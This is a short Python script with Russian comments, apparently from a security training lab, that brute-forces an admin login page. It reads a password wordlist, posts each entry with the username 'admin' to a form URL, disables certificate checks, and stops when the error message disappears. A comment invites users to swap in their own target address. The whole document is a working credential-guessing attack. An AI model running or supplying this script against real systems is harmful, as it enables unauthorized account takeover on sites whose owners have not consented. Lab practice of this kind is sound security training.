import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# URL веб-страницы с формой замените на свой адрес
url = 'https://web.eurkt27bbt4hjshkmsji.labs.cyber-ed.space/admin/'

# не забудьте загрузить путь к словарю паролей
password_file = 'passwords.txt'

# Открытие список паролей для проверки
with open(password_file, 'r') as file:
    passwords = file.readlines()

# Процесс проверки каждого пароля
for password in passwords:
    password = password.strip()  # Убираем лишние пробелы и символы новой строки
    data = {'username': 'admin', 'password': password}  # Формируем данные для отправки в форму
    response = requests.post(url, data=data, verify=False, allow_redirects=False)

    # Проверка, если не найдено сообщение об ошибке или редирект после успешного входа
    if 'Wrong username' not in response.text and 'Login' not in response.text:
        print(f"Успешный вход с паролем: {password}")
        break
    else:
        print(f"Неверный пароль: {password}")
